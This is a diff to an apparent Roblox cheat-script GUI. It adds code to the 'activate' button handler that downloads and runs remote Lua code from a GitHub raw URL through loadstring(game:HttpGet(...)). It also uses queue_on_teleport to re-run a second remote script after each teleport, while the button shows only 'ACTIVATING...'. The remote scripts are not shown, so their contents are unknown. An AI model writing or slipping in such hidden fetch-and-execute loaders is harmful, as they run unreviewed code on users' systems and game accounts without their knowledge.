@@ -244,6 +244,12 @@ closeButton.MouseButton1Click:Connect(closeGUI)
 local function activateScript()
     activateButton.Text = "ACTIVATING..."
     activateButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+
+    queue_on_teleport([[
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/newvisual.lua"))()
+    ]])
+    task.wait(5)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
     
     local pulseTween = TweenService:Create(activateButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true), {
         BackgroundTransparency = 0.3
